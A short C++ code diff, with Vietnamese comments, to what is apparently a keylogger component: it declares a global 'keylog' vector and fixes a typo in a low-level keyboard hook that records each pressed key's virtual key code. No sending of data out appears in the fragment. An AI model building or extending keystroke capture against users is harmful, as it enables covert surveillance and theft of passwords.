@@ -4,6 +4,7 @@
 
 bool KLG_Func::keylogging = false;
 HHOOK KLG_Func::hook = NULL;
+std::vector<int> keylog;
 
 LRESULT KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
@@ -18,7 +19,7 @@ LRESULT KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 		KBDLLHOOKSTRUCT* pkbhs = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
 
 		// Nếu là sự kiện nhấn phím, lưu phím vào biến tạm
-		keylog.push_back(pkbhs->vkCode);k
+		keylog.push_back(pkbhs->vkCode);
 	}
 
 	// Gọi hàm xử lý sự kiện tiếp theo trong chuỗi xử lý
